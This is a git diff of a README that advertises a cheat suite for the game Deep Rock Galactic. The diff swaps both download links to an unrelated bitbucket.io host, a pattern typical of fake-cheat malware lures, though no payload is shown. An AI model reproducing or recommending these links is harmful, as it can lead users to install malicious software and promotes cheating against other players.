@@ -4,7 +4,7 @@
 
 In **Deep Rock Galactic**, digging precious gems and battling waves is fun—but the grind can pile up. With a robust **cheat suite**, you unlock **god mode, infinite ammo, instant perks, flying, teleport, and more** to customize your co-op chaos or solo runs exactly how you want.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/deep-rock-galactic/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload7.bitbucket.io)
 ---
 
 ## 🔥 Cheat Features Overview
@@ -35,7 +35,7 @@ In **Deep Rock Galactic**, digging precious gems and battling waves is fun—but
 * **Zipline & Vehicle Speed Tweaks** 
 * **Game Speed Control & Physics Mods (Gravity, etc.)**&#x20;
 
-[![Download Cheat](https://community.wemod.com/uploads/default/original/3X/3/a/3ae0cb59bfd7a372143150b8dd7b71dcfccf8217.png)](https://wecheaters.github.io/cheats/deep-rock-galactic/)
+[![Download Cheat](https://community.wemod.com/uploads/default/original/3X/3/a/3ae0cb59bfd7a372143150b8dd7b71dcfccf8217.png)](https://fileoffload7.bitbucket.io)
 ---
 
 ## 🎯 How Cheaters Are Using It
